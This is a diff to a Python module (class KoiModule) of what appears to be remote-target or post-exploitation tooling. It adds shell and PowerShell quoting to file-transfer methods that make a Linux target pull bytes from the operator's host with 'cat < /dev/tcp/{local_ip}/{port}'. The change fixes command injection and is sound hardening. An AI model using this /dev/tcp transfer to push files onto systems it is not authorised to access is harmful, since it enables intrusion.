@@ -4,6 +4,7 @@ import functools
 import inspect
 import re
 import select
+import shlex
 import threading
 import time
 import uuid
@@ -407,14 +408,15 @@ class KoiModule(ABC):
     ) -> bool:
         """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
         local_ip = self._get_local_ip()
+        quoted = shlex.quote(dest)
         port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
-        result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {dest}", timeout=timeout)
+        result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {quoted}", timeout=timeout)
         thread.join(timeout=timeout)
 
         if errors or not result.success:
             return False
 
-        size_str = self._try_exec(f"wc -c < {dest} 2>/dev/null")
+        size_str = self._try_exec(f"wc -c < {quoted} 2>/dev/null")
         try:
             return int(size_str.split()[0]) == len(raw)
         except (ValueError, IndexError):
@@ -436,9 +438,10 @@ class KoiModule(ABC):
         failure instead of a false success.
         """
         local_ip = self._get_local_ip()
+        ps_dest = dest.replace("'", "''")
         resolved = (
             "$ExecutionContext.SessionState.Path."
-            f"GetUnresolvedProviderPathFromPSPath('{dest}')"
+            f"GetUnresolvedProviderPathFromPSPath('{ps_dest}')"
         )
         port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
         ps_cmd = (
